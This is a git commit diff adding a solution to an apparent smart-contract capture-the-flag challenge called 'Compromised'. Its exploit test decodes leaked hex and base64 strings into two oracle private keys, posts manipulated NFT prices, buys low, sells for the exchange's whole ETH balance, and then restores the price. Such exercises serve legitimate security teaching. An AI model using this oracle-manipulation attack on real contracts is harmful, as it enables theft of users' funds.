9c003a9a2060f766755dac9b0cf793cced7de3a6
byeonggoon <dla6762@gmail.com>
2023-01-28 16:31:41 +0900

    add compromise solution

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -75,6 +75,124 @@ describe("Compromised challenge", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+
+    /** CODE YOUR EXPLOIT HERE */
+    // Helper function for converting the data from Base64 format into a private key in hex format
+    const leakToPrivateKey = (leak) => {
+      const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(
+        `utf8`
+      );
+      const hexKey = Buffer.from(base64, `base64`).toString(`utf8`);
+      return hexKey;
+    };
+
+    const leakTobase64 = (leak) => {
+      const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(
+        `utf8`
+      );
+      return base64;
+    };
+
+    // Leaked information to format
+    const leakedInformation = [
+      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
+      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34",
+    ];
+
+    function hexToText(hex) {
+      var hex = hex.toString().replace(/\s+/g, "");
+      var str = "";
+      for (var i = 0; i < hex.length; i += 2)
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+      return str;
+    }
+
+    const zinToPrivateKey = (hex) => {
+      var hex = hex.toString().replace(/\s+/g, "");
+      var str = "";
+      for (var i = 0; i < hex.length; i += 2)
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+      var decodedString = Buffer.from(str, "base64").toString();
+      return decodedString;
+    };
+
+    function base64Decode(encodedString) {
+      // var decodedString = atob(encodedString);
+      var decodedString = Buffer.from(encodedString, "base64").toString();
+      return decodedString;
+    }
+
+    // function base64Decode(encodedString) {
+
+    const newpKey1 = zinToPrivateKey(leakedInformation[0]);
+    console.log("newpKey1", newpKey1);
+
+    const hexToText1111 = hexToText(leakedInformation[0]);
+    console.log("hexToText1111", hexToText1111);
+    const catchPkey = base64Decode(hexToText1111);
+    console.log("catchPkey", catchPkey);
+
+    const base64key1 = leakTobase64(leakedInformation[0]);
+    const base64key2 = leakTobase64(leakedInformation[1]);
+    console.log("base64key1", base64key1);
+    console.log("base64key2", base64key2);
+
+    // Get private keys and initialize wallets
+    const privateKey1 = leakToPrivateKey(leakedInformation[0]);
+    const privateKey2 = leakToPrivateKey(leakedInformation[1]);
+    console.log("privateKey1", privateKey1);
+    console.log("privateKey2", privateKey2);
+
+    const trustedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);
+    const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);
+
+    // Get the symbol of the NFT to be changed
+    const tokenSymbol = await this.nftToken.symbol();
+
+    // Change its price to zero
+    console.log(
+      "NFT price before attack: ",
+      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+    );
+    await this.oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0);
+    await this.oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0);
+
+    // Buy the NFT paying 1 wei
+    console.log(
+      "NFT price when buying: ",
+      String(await this.oracle.getMedianPrice(tokenSymbol))
+    );
+    await this.exchange
+      .connect(attacker)
+      .buyOne({ value: ethers.utils.parseEther("0.01") });
+
+    // Change price of the owned NFT to the balance amount in the Exchange contract
+    await this.oracle
+      .connect(trustedOracle1)
+      .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);
+    await this.oracle
+      .connect(trustedOracle2)
+      .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);
+
+    // Approve NFT to the exchange and sell it for all  its ETH
+    console.log(
+      "NFT price when selling: ",
+      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+    );
+    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+    await this.exchange.connect(attacker).sellOne(0);
+
+    // Change price back to its original value
+    await this.oracle
+      .connect(trustedOracle1)
+      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
+    await this.oracle
+      .connect(trustedOracle2)
+      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
+    console.log(
+      "NFT price after attack: ",
+      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+    );
   });
 
   after(async function () {
